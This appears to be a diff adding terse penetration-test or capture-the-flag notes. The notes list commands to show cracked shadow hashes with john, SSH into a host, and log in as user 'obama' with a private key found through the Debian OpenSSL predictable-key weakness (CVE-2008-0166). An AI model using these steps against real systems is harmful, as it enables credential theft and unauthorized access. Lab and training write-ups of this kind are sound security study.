@@ -1,0 +1,15 @@
+john --show shadow.hash
+
+ssh vmware@x.x.x.x
+
+ /home/obama/.ssh/authorized_keys
+ #ssh key file path#
+ 
+The ssh authorized_keys are vulnerable to Debian OpenSSL Predictable PRNG (CVE-2008-0166)
+Debian OpenSSL Predictable PRNG (CVE-2008-0166)
+
+grep -lr ********.pub
+
+ssh -i xxxxxx(key) obama@x.x.x.x 
+
+
